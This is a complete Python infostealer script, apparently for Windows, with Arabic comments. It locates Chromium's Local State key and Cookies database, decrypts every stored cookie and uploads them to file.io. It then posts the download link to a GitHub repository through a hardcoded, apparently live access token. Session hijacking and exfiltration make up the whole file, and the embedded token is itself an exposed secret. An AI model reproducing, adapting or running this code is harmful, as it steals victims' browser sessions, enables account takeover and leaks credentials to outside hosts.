import os, json, base64, sqlite3, shutil, requests, time
from Crypto.Cipher import AES
import win32crypt

# إعدادات المستودع الخاص بك
TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
REPO = "Noor092324/Noor-config"

def find_files():
    root = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
    paths = {"key": None, "db": None}
    for r, d, f in os.walk(root):
        if "Local State" in f and not paths["key"]:
            paths["key"] = os.path.join(r, "Local State")
        if "Cookies" in f and "Network" in r:
            paths["db"] = os.path.join(r, "Cookies")
        if paths["key"] and paths["db"]: break
    return paths

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
    except: return None

def extract():
    p = find_files()
    if not p["key"] or not p["db"]: return None
    key = get_master_key(p["key"])
    if not key: return None
    shutil.copyfile(p["db"], "temp.db")
    conn = sqlite3.connect("temp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    out = ""
    for host, name, enc in cursor.fetchall():
        try:
            cipher = AES.new(key, AES.MODE_GCM, enc[3:15])
            val = cipher.decrypt(enc[15:])[:-16].decode()
            out += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
        except: continue
    conn.close()
    if os.path.exists("temp.db"): os.remove("temp.db")
    with open("cookies.txt", "w", encoding="utf-8") as f: f.write(out)
    return "cookies.txt"

def send_link(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    head = {"Authorization": f"token {TOKEN}"}
    try:
        res = requests.get(url, headers=head).json()
        sha = res["sha"]
        msg = {"status": "Ready", "url": link, "time": time.ctime()}
        content = base64.b64encode(json.dumps(msg, indent=2).encode()).decode()
        requests.put(url, headers=head, json={"message": "Update", "content": content, "sha": sha})
    except: pass

if __name__ == "__main__":
    file = extract()
    if file:
        while True:
            try:
                with open(file, "rb") as f:
                    r = requests.post("https://file.io", files={"file": f})
                if r.status_code == 200:
                    send_link(r.json().get("link"))
                    os.remove(file)
                    break
            except: time.sleep(60)
                        
